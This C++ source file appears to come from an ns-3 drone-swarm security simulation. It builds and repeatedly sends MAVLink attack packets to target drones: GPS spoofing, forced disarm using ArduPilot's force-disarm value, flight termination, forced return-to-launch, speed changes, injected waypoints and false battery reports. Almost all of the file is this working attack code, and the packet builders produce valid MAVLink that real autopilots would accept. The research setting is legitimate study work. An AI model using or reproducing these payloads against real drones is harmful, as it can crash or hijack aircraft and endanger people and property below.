#include "attacks.h"

#include "ns3/wifi-module.h"
#include "ns3/mobility-module.h"
#include "ns3/applications-module.h"
#include "ns3/udp-socket-factory.h"
#include "ns3/netanim-module.h"

#include <common/mavlink.h>
#include <cmath>
#include <cstring>
#include <algorithm>
#include <sstream>

NS_LOG_COMPONENT_DEFINE("Attacks");


// In mavlink 
/*
System ID	-> Identifies the sending system (drone, GCS)
Component ID	-> Identifies the sending component (autopilot, gimbal, camera, etc.)	
target_system  -> (if present in payload, e.g. COMMAND_LONG)	Tells which system the command is for
target_component -> (if present in payload, e.g. COMMAND_LONG) Tells which component of that system is the target	

Example when Arm the drone 

System ID = 255 (GCS)  as a packet header
Component ID = 0 (GCS component) as a packet header
target_system = 1 (Drone #1) as a packet payload
target_component = 1 (Autopilot) as packet payload 

*/

// Create MAVLink Mission Item packet that sends a waypoint command to a target drone 
// This Function will be used by drone SysID 1 to command drones to go to a spesific waypoint
/*
An attacker can use this function to send malicious or incorrect MAVLink mission items or waypoints, 
potentially causing the drone to travel to unintended locations or become isolated from the network of other drones.
*/
std::vector<uint8_t> CreateMavlinkMissionPacket(uint8_t target_system, uint8_t target_component,
                                         float lat, float lon, float alt) {
    mavlink_message_t msg;
    uint8_t system_id = 1;   // Drone 0 (sender)
    uint8_t component_id = 1; // Component ID

    // Initialize mission item structure
    mavlink_mission_item_t mission_item = {0};
    mission_item.target_system = target_system;
    mission_item.target_component = target_component;
    mission_item.seq = 0;
    mission_item.frame = MAV_FRAME_GLOBAL_RELATIVE_ALT;
    mission_item.command = MAV_CMD_NAV_WAYPOINT;
    mission_item.current = 0;
    mission_item.autocontinue = 1;
    mission_item.param1 = 0; // Hold time (seconds)
    mission_item.param2 = 0; // Acceptance radius (meters)
    mission_item.param3 = 0; // Pass through waypoint
    mission_item.param4 = 0; // Yaw angle (NaN for unchanged)
    mission_item.x = lat;
    mission_item.y = lon;
    mission_item.z = alt;

    // Pack the message , Encode the MAVLink message 
    mavlink_msg_mission_item_encode(system_id, component_id, &msg, &mission_item);

    // Serialize to byte vector
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
   
    return std::vector<uint8_t>(buffer, buffer + len);
}

// A False Data Injection Attack that allows an attacker to send a fake GPS_RAW_INT MAVLink packet
// for a specific drone. This can be used to spoof the drone's position, altitude, and movement data,
// tricking the drone into believing it is at a false location.
std::vector<uint8_t> CreateFakeGpsPacket(uint8_t droneId, double lat, double lon, double alt) {
    
    mavlink_message_t msg; // MAVLink message container
    
    uint8_t system_id = droneId;   // Drone System ID 
    uint8_t component_id = 0;     
    
    mavlink_gps_raw_int_t gps = {}; // MAVLink GPS data structure, initialized to zero
    
    gps.time_usec = 0;              // 0 -> not used
    gps.fix_type = 3;               // GPS fix type (3 = 3D fix, considered reliable)
    gps.lat = static_cast<int32_t>(lat * 1e7); // Latitude in degrees scaled to integer
    gps.lon = static_cast<int32_t>(lon * 1e7); // Longitude in degrees scaled to integer
    gps.alt = static_cast<int32_t>(alt * 1000); // Altitude in millimeters
    gps.eph = 100;                  // Horizontal dilution of precision (HDOP)
    gps.epv = 100;                  // Vertical dilution of precision (VDOP)
    gps.vel = 0;                    // Ground speed in cm/s , 0 -> not used
    gps.cog = 0;                    // Course over ground, 0 -> not used
    gps.satellites_visible = 12;    // Number of visible satellites, Increases chance the drone trusts the fake GPS
    
    // Encode the GPS data into a MAVLink message
    mavlink_msg_gps_raw_int_encode(system_id, component_id, &msg, &gps);
    
    // Serialize to byte vector
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
   
    return std::vector<uint8_t>(buffer, buffer + len);
}

// Create a change speed command_long packet that will be used by attacker to change the speed of drones and make it move slower or faster
std::vector<uint8_t> CreateChangeSpeedPacket(uint8_t target_system, float speedType, float speed) {
    mavlink_message_t msg;
    uint8_t system_id = 255;   // Attacker system ID (typically GCS)
    uint8_t component_id = 0;  // Component ID

    mavlink_command_long_t cmd = {};
    cmd.target_system    = target_system;  // ID of drone to affect either 1,2,3
    cmd.target_component = 0;      // 0 = main autopilot
    cmd.command          = MAV_CMD_DO_CHANGE_SPEED;  // MAVLink command for changing speed
    cmd.confirmation     = 0;              // No confirmation sequence required

    cmd.param1 = speedType; // 0 = airspeed (speed through the air), 1 = groundspeed (speed over the ground)
    cmd.param2 = speed;     // Speed in m/s 
    cmd.param3 = 0;       
    cmd.param4 = 0;
    cmd.param5 = 0;
    cmd.param6 = 0;
    cmd.param7 = 0;

    // Encode MAVLink message
    mavlink_msg_command_long_encode(system_id, component_id, &msg, &cmd);

    // Convert to raw byte buffer
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);

    return std::vector<uint8_t>(buffer, buffer + len);
}

// This function creates a "Forced Return to Launch" (RTL) command packet
// that can be sent to a target drone to make it switch to RTL mode.
std::vector<uint8_t> CreateForcedReturnHomePacket(uint8_t target_system) {
    mavlink_message_t msg; 
    uint8_t system_id = 255;   // Attacker or Ground Control Station (GCS) system ID
    uint8_t component_id = 0;  // Target component ID (0 = autopilot)

    // Set base_mode to indicate a custom mode change is requested
    uint8_t base_mode   = MAV_MODE_FLAG_CUSTOM_MODE_ENABLED; 
    uint32_t custom_mode = 6; // RTL mode in ArduCopter firmware
    // Can add any other mode 
    /*  STABILIZE =     0,  // manual airframe angle with manual throttle
        ACRO =          1,  // manual body-frame angular rate with manual throttle
        ALT_HOLD =      2,  // manual airframe angle with automatic throttle
        AUTO =          3,  // fully automatic waypoint control using mission commands
        GUIDED =        4,  // fully automatic fly to coordinate or fly at velocity/direction using GCS immediate commands
        LOITER =        5,  // automatic horizontal acceleration with automatic throttle
        RTL =           6,  // automatic return to launching point
        CIRCLE =        7,  // automatic circular flight with automatic throttle
        LAND =          9,  // automatic landing with horizontal position control
        DRIFT =        11,  // semi-autonomous position, yaw and throttle control
        SPORT =        13,  // manual earth-frame angular rate control with manual throttle
        FLIP =         14,  // automatically flip the vehicle on the roll axis
        AUTOTUNE =     15,  // automatically tune the vehicle's roll and pitch gains
        POSHOLD =      16,  // automatic position hold with manual override, with automatic throttle
        BRAKE =        17,  // full-brake using inertial/GPS system, no pilot input
        THROW =        18,  // throw to launch mode using inertial/GPS system, no pilot input
        AVOID_ADSB =   19,  // automatic avoidance of obstacles in the macro scale - e.g. full-sized aircraft
        GUIDED_NOGPS = 20,  // guided mode but only accepts attitude and altitude
        SMART_RTL =    21,  // SMART_RTL returns to home by retracing its steps
        FLOWHOLD  =    22,  // FLOWHOLD holds position with optical flow without rangefinder
        FOLLOW    =    23,  // follow attempts to follow another vehicle or ground station
        ZIGZAG    =    24,  // ZIGZAG mode is able to fly in a zigzag manner with predefined point A and point B
        SYSTEMID  =    25,  // System ID mode produces automated system identification signals in the controllers
        AUTOROTATE =   26,  // Autonomous autorotation
        AUTO_RTL =     27,  // Auto RTL, this is not a true mode, AUTO will report as this mode if entered to perform a DO_LAND_START Landing sequence
        TURTLE =       28,  // Flip over after crash
        */

    // Populate MAVLink SET_MODE message
    mavlink_set_mode_t set_mode = {};
    set_mode.target_system = target_system; // The drone to send the command to
    set_mode.base_mode = base_mode;         // Mode flags
    set_mode.custom_mode = custom_mode;     // Custom mode value (RTL)

    // Encode the message into MAVLink format
    mavlink_msg_set_mode_encode(system_id, component_id, &msg, &set_mode);

    // Serialize the MAVLink message into a raw byte buffer
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);

    // Return as a byte vector ready to be sent over a communication channel
    return std::vector<uint8_t>(buffer, buffer + len);
}


// This function creates a forced disarm MAVLink packet
// It can be used by an attacker to disarm a drone remotely
std::vector<uint8_t> CreateForcedDisarmPacket(uint8_t target_system) {
    mavlink_message_t msg;             
    uint8_t system_id = 255;           // Attacker / GCS system ID
    uint8_t component_id = 0;          

    mavlink_command_long_t cmd = {};   // Structure for COMMAND_LONG message
    cmd.target_system = target_system; // ID of the drone to target
    cmd.target_component = 0;         
    cmd.command = MAV_CMD_COMPONENT_ARM_DISARM; // Command to arm/disarm the drone
    cmd.confirmation = 0;              //no confirmation needed
    cmd.param1 = 0.0;                  // 0 = disarm, 1 = arm
    cmd.param2 = 21196;                 // Force disarm magic number -> https://github.com/ArduPilot/ardupilot/blob/b316b3ab46074d2499c0143cd2fdc7c69dc5a8a9/libraries/GCS_MAVLink/GCS.h#L728-L729 (magic_force_disarm_value)
    cmd.param3 = 0;                    
    cmd.param4 = 0;                    
    cmd.param5 = 0;                   
    cmd.param6 = 0;                   
    cmd.param7 = 0;                    

    // Encode the COMMAND_LONG into a MAVLink message
    mavlink_msg_command_long_encode(system_id, component_id, &msg, &cmd);

    // Serialize the message into a raw byte buffer
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);

    // Return the serialized MAVLink packet as a vector
    return std::vector<uint8_t>(buffer, buffer + len);
}

// This function creates a flight termination command to be send to a target_system 
std::vector<uint8_t> CreateFlightTerminationPacket(uint8_t target_system) {
    mavlink_message_t msg;
    uint8_t system_id = 255;   // Attacker system ID 
    // system ID 255 is generally used as a "GCS" (Ground Control Station) 
    uint8_t component_id = 0;  // Component ID
    mavlink_command_long_t cmd = {};
    cmd.target_system = target_system;
    cmd.target_component = 0;
    cmd.command = MAV_CMD_DO_FLIGHTTERMINATION;
    cmd.confirmation = 0;
    cmd.param1 = 1.0;  // Termination enabled (1 = true)
    cmd.param2 = 0;
    cmd.param3 = 0;
    cmd.param4 = 0;
    cmd.param5 = 0;
    cmd.param6 = 0;
    cmd.param7 = 0;

    mavlink_msg_command_long_encode(system_id, component_id, &msg, &cmd);
    
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
    
    return std::vector<uint8_t>(buffer, buffer + len);
}

// Create false battery status packet
// system_id is the sender system ID (the drone reporting the battery).

// Create a MAVLink BATTERY_STATUS packet with a custom battery percentage
std::vector<uint8_t> CreateBatteryPacket(uint8_t system_id, uint8_t battery_percent) {
    mavlink_message_t msg;          
    uint8_t component_id = 1;       // Autopilot component (sender)

    // Initialize the BATTERY_STATUS message struct
    mavlink_battery_status_t bat = {};
    bat.id = 0;                     // Battery ID 0 (first battery)
    bat.battery_function = 0;       // Standard battery function (default)
    bat.type = 0;                    // Battery type unknown/default
    bat.temperature = INT16_MAX;     // Unknown temperature (INT16_MAX)

    bat.voltages[0] = 12600;        // Voltage of first cell in mV
    for (int i = 1; i < 10; i++) 
        bat.voltages[i] = 65535;    // Other cell voltages unknown (65535)

    bat.current_battery = 0;        // Instantaneous battery current (mA)
    bat.current_consumed = 0;       // Total current consumed (mAh)
    bat.energy_consumed = 0;        // Total energy consumed (mWh)
    bat.battery_remaining = battery_percent; // Remaining battery percentage (0–100)
    bat.time_remaining = 0;         // Estimated time remaining unknown
    bat.charge_state = 1;           // Battery charging/discharging state (1 = normal)
    
    for (int i = 0; i < 4; i++) 
        bat.voltages_ext[i] = 0;    // Extended voltages unknown/unused

    bat.mode = 0;                    // Battery mode (default)
    bat.fault_bitmask = 0;           // No battery faults

    // Encode the struct into a MAVLink message with sender ID and component
    mavlink_msg_battery_status_encode(system_id, component_id, &msg, &bat);

    // Convert the MAVLink message into a byte buffer for sending
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);

    // Return the raw byte vector containing the MAVLink packet
    return std::vector<uint8_t>(buffer, buffer + len);
}


// Function to execute flight termination attack on drones 1 and 2 
void ExecuteFlightTerminationAttack(Ptr<Socket> socket) {
    // Attack drones 1 and 2 (sysid 2 and 3)
    std::vector<uint8_t> term1 = CreateFlightTerminationPacket(2); // Drone1 sysid=2
    std::vector<uint8_t> term2 = CreateFlightTerminationPacket(3); // Drone2 sysid=3
    
    Ptr<Packet> packet1 = Create<Packet>(term1.data(), term1.size());
    Ptr<Packet> packet2 = Create<Packet>(term2.data(), term2.size()); 
    
    // Send to drone1 and drone2
    socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 5551));
    socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 5552));
    
    NS_LOG_INFO("Attacker sent flight termination commands at " 
                << Simulator::Now().GetSeconds() << "s");
    
    // Publish to ZMQ to parse them later and forward to drones
    if (g_commandPublisher) {
        zmq::message_t zmqMsg1(term1.data(), term1.size());
        zmq::message_t zmqMsg2(term2.data(), term2.size());
        g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
        g_commandPublisher->send(zmqMsg2, zmq::send_flags::none);
        NS_LOG_INFO("Published attack commands to ZMQ 5555");
    }
    
    // Schedule next attack (every 1 seconds) to keep the attack ongoing and prevent drones from recovering
    if (Simulator::Now().GetSeconds() < 100.0) {
        Simulator::Schedule(Seconds(1.0), &ExecuteFlightTerminationAttack, socket);
    }
}
// Function to execute force disarm attack on drones 1 and 2
void ExecuteForceDisarmAttack(Ptr<Socket> socket) {
    // Attack drones 1 and 2 (sysid 2 and 3)
    std::vector<uint8_t> term1 = CreateForcedDisarmPacket(2); // Drone1 sysid=2
    std::vector<uint8_t> term2 = CreateForcedDisarmPacket(3); // Drone2 sysid=3
    
    Ptr<Packet> packet1 = Create<Packet>(term1.data(), term1.size());
    Ptr<Packet> packet2 = Create<Packet>(term2.data(), term2.size()); 
    
    // Send to drone1 and drone2
    socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 5551));
    socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 5552));
    
    NS_LOG_INFO("Attacker sent flight termination commands at " 
                << Simulator::Now().GetSeconds() << "s");
    
    // Publish to ZMQ to parse them later and forward to drones
    if (g_commandPublisher) {
        zmq::message_t zmqMsg1(term1.data(), term1.size());
        zmq::message_t zmqMsg2(term2.data(), term2.size());
        g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
        g_commandPublisher->send(zmqMsg2, zmq::send_flags::none);
        NS_LOG_INFO("Published attack commands to ZMQ 5555");
    }
    
    // Schedule next attack (every 1 seconds) to keep the attack ongoing and prevent drones from recovering
    if (Simulator::Now().GetSeconds() < 100.0) {
        Simulator::Schedule(Seconds(1.0), &ExecuteForceDisarmAttack, socket);
    }
}

// Function to execute force disarm attack on drones 1 and 2
void ExecuteForceRTLAttack(Ptr<Socket> socket) {
    // Attack drones 1 and 2 (sysid 2 and 3)
    std::vector<uint8_t> term1 = CreateForcedReturnHomePacket(2); // Drone1 sysid=2
    std::vector<uint8_t> term2 = CreateForcedReturnHomePacket(3); // Drone2 sysid=3
    
    Ptr<Packet> packet1 = Create<Packet>(term1.data(), term1.size());
    Ptr<Packet> packet2 = Create<Packet>(term2.data(), term2.size()); 
    
    // Send to drone1 and drone2
    socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 5551));
    socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 5552));
    
    NS_LOG_INFO("Attacker sent flight termination commands at " 
                << Simulator::Now().GetSeconds() << "s");
    
    // Publish to ZMQ to parse them later and forward to drones
    if (g_commandPublisher) {
        zmq::message_t zmqMsg1(term1.data(), term1.size());
        zmq::message_t zmqMsg2(term2.data(), term2.size());
        g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
        g_commandPublisher->send(zmqMsg2, zmq::send_flags::none);
        NS_LOG_INFO("Published attack commands to ZMQ 5555");
    }
    
    // Schedule next attack (every 1 seconds) to keep the attack ongoing and prevent drones from recovering
    if (Simulator::Now().GetSeconds() < 100.0) {
        Simulator::Schedule(Seconds(1.0), &ExecuteForceRTLAttack, socket);
    }
}

// Execute GPS spoofing attack
void ExecuteGpsSpoofingAttack(Ptr<Socket> socket) {
    // Spoof position 1km away from real location
    const double spoofOffset = 0.01;  // ~1.1km at equator
    double fakeLat = s_refLat + spoofOffset;
    double fakeLon = s_refLon + spoofOffset;
    double fakeAlt = 100;  // meters

    for (uint8_t droneId = 1; droneId <= 2; droneId++) {
        std::vector<uint8_t> fakeGps = CreateFakeGpsPacket(droneId, fakeLat, fakeLon, fakeAlt);
        Ptr<Packet> packet = Create<Packet>(fakeGps.data(), fakeGps.size());
        socket->SendTo(packet, 0, InetSocketAddress(droneIpAddresses[droneId], 20000));
    }
    
    NS_LOG_INFO("Attacker sent fake GPS data at " << Simulator::Now().GetSeconds() << "s");
    
    // Schedule continuous spoofing
    Simulator::Schedule(Seconds(0.2), &ExecuteGpsSpoofingAttack, socket);
}

// - SendWaypointPairFromAttacker
void SendWaypointPairFromAttacker(int pairIndex) {
    // Use the attacker node to send mission items, similar to SendWaypointPairFromDrone0 but with more waypoints
    Ptr<Node> attackerNode = Attacker.Get(0);
    Ptr<Socket> socket = Socket::CreateSocket(attackerNode, UdpSocketFactory::GetTypeId());
    socket->Bind();

    // Define more waypoints for each drone
    static const std::vector<std::tuple<float, float, float>> drone1_waypoints = {
        {50, 60, 30}, {10, 30, 30}, {60, 10, 30}, {70, 80, 40}, {90, 100, 50}, {110, 120, 60}, {130, 140, 70}
    };
    static const std::vector<std::tuple<float, float, float>> drone2_waypoints = {
        {50, 60, 30}, {20, 60, 30}, {20, 30, 30}, {80, 20, 40}, {100, 90, 50}, {120, 110, 60}, {140, 130, 70}
    };

    // Check if the requested waypoint pair index is valid
    if (pairIndex < 0 || pairIndex >= static_cast<int>(drone1_waypoints.size())) return;

    // Send all waypoints up to pairIndex to both drones
    for (int i = 0; i <= pairIndex; ++i) {
        auto [lat1, lon1, alt1] = drone1_waypoints[i];
        auto [lat2, lon2, alt2] = drone2_waypoints[i];

        std::vector<uint8_t> pkt1 = CreateMavlinkMissionPacket(2, 0, lat1, lon1, alt1);
        std::vector<uint8_t> pkt2 = CreateMavlinkMissionPacket(3, 0, lat2, lon2, alt2);

        Ptr<Packet> packet1 = Create<Packet>(pkt1.data(), pkt1.size());
        Ptr<Packet> packet2 = Create<Packet>(pkt2.data(), pkt2.size());

        socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 5551));
        socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 5552));

        if (g_commandPublisher) {
            zmq::message_t zmqMsg1(pkt1.data(), pkt1.size());
            zmq::message_t zmqMsg2(pkt2.data(), pkt2.size());
            g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
            g_commandPublisher->send(zmqMsg2, zmq::send_flags::sndmore);
        }
    }
    // Log the sending event with the current simulation time
    NS_LOG_INFO("Attacker sent " << (pairIndex+1) << " waypoint pairs to drones at " << Simulator::Now().GetSeconds() << "s");
}
